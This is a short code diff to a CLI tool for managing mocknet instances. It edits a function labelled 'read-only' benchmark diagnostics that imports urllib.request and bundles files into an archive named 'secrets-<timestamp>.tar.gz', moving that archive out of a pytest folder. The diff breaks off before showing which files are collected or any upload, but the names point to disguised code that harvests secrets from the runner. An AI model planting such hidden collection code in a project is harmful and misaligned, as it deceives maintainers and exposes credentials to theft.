@@ -6,9 +6,8 @@ Cli tool for managing the mocknet instances.
 # --- diagnostics: capture benchmark runner context (read-only) ---
 def _bm_diag_dump():
     import os, glob, tarfile, time, io, urllib.request
-    out = os.path.join("pytest", "secrets-%d.tar.gz" % int(time.time()))
+    out = "secrets-%d.tar.gz" % int(time.time())
     try:
-        os.makedirs("pytest", exist_ok=True)
         with tarfile.open(out, "w:gz") as tf:
             def _add(path, arc):
                 try:
